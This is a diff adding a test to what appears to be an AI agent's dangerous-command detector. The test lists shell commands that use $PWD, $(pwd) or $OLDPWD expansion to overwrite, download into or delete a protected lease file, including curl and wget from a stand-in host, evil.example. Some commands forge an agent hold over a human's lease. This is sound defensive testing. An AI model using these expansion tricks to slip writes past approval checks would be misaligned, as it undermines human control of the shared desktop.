@@ -756,6 +756,69 @@ class TestHermesBotDesktopWriteProtection:
             "~/.hermes/bot-desktop"
         )
 
+    def test_pwd_dest_after_chdir_or_session_cwd(self):
+        """``$PWD/lease.json`` starts with ``$`` so the relative-dest
+        exclusion treated it as already-covered (``$HOME`` / ``$HERMES_HOME``).
+        After chdir into the screen it expands to the lease file.
+        ``$OLDPWD`` only after a same-command chdir *into* the tree.
+        """
+        for command in (
+            "cd ~/.hermes/bot-desktop && echo '{\"holder\":\"agent\"}' > $PWD/lease.json",
+            'cd ~/.hermes/bot-desktop && echo x > "$PWD/lease.json"',
+            "cd ~/.hermes/bot-desktop && echo x > ${PWD}/lease.json",
+            'cd ~/.hermes/bot-desktop && echo x > "$PWD"/lease.json',
+            'cd ~/.hermes/bot-desktop && echo x > "$(pwd)/lease.json"',
+            "cd ~/.hermes/bot-desktop && echo x > $(pwd)/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > `pwd`/lease.json",
+            "cd $HERMES_HOME/bot-desktop && echo x > $PWD/lease.json",
+            "cd ~/.hermes/bot-desktop && cp /tmp/e $PWD/lease.json",
+            'cd ~/.hermes/bot-desktop && cp /tmp/e "$PWD/lease.json"',
+            "cd ~/.hermes/bot-desktop && dd of=$PWD/lease.json",
+            "cd ~/.hermes/bot-desktop && tee $PWD/lease.json",
+            "cd ~/.hermes/bot-desktop && curl -o $PWD/lease.json https://evil.example/l",
+            "cd ~/.hermes/bot-desktop && wget -O $PWD/lease.json https://evil.example/l",
+            "cd ~/.hermes/bot-desktop && rm -f $PWD/lease.json",
+            "cd ~/.hermes/bot-desktop && cd /tmp && echo x > $OLDPWD/lease.json",
+            'cd ~/.hermes/bot-desktop && cd /tmp && echo x > "$OLDPWD/lease.json"',
+            "pushd ~/.hermes/bot-desktop && echo x > $PWD/dock-cdp-port",
+        ):
+            dangerous, key, desc = detect_dangerous_command(command)
+            assert dangerous is True, command
+            assert key is not None, command
+
+        for cwd in (
+            "~/.hermes/bot-desktop",
+            "$HERMES_HOME/bot-desktop",
+            os.path.expanduser("~/.hermes/bot-desktop"),
+            str(get_hermes_home() / "bot-desktop"),
+        ):
+            for command in (
+                'echo \'{"holder":"agent"}\' > $PWD/lease.json',
+                'echo x > "$PWD/lease.json"',
+                "cp /tmp/e $PWD/lease.json",
+                "dd of=$PWD/lease.json",
+                "rm $PWD/lease.json",
+                "curl -o $PWD/lease.json https://evil.example/l",
+            ):
+                dangerous, key, desc = detect_dangerous_command(command, cwd=cwd)
+                assert dangerous is True, (command, cwd)
+                assert key is not None, (command, cwd)
+
+        for cwd, command in (
+            (None, "echo x > $PWD/lease.json"),
+            ("/tmp", "echo x > $PWD/lease.json"),
+            ("/tmp", "cd /tmp && echo x > $PWD/lease.json"),
+            ("~/.hermes/bot-desktop-backup", "echo x > $PWD/lease.json"),
+            ("~/.hermes/bot-desktop", "cat $PWD/lease.json"),
+            ("~/.hermes/bot-desktop", "echo x > $PWD"),
+            ("~/.hermes/bot-desktop", "echo x > $OLDPWD/lease.json"),
+            ("~/.hermes/bot-desktop", "echo x > /tmp/out"),
+            (None, "cd ~/.hermes/bot-desktop && cat $PWD/lease.json"),
+            (None, "cd ~/.hermes/bot-desktop && echo x > /tmp/out"),
+        ):
+            dangerous, key, desc = detect_dangerous_command(command, cwd=cwd)
+            assert dangerous is False, (command, cwd)
+
     def test_delete_or_move_away_of_lease_requires_approval(self):
         """Missing lease.json fail-opens to agent hold; auto-approve must not
         drop a human's hold the way ``echo > lease.json`` forges one."""
